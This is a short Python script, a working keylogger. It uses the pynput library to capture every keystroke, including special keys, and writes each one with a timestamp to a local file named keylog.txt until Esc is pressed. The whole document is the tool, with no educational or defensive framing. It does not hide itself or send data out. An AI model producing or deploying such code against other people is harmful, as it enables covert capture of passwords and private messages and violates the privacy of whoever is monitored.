import logging
from pynput.keyboard import Key, Listener
from datetime import datetime
# Configure logging to exclude milliseconds
logging.basicConfig(
    filename="keylog.txt",
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"  # Excludes milliseconds
)
def on_press(key):
    """Callback function to handle key press events."""
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")
def on_release(key):
    """Callback function to handle key release events."""
    if key == Key.esc:
        return False  # Stop listener when 'Esc' key is pressed
# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()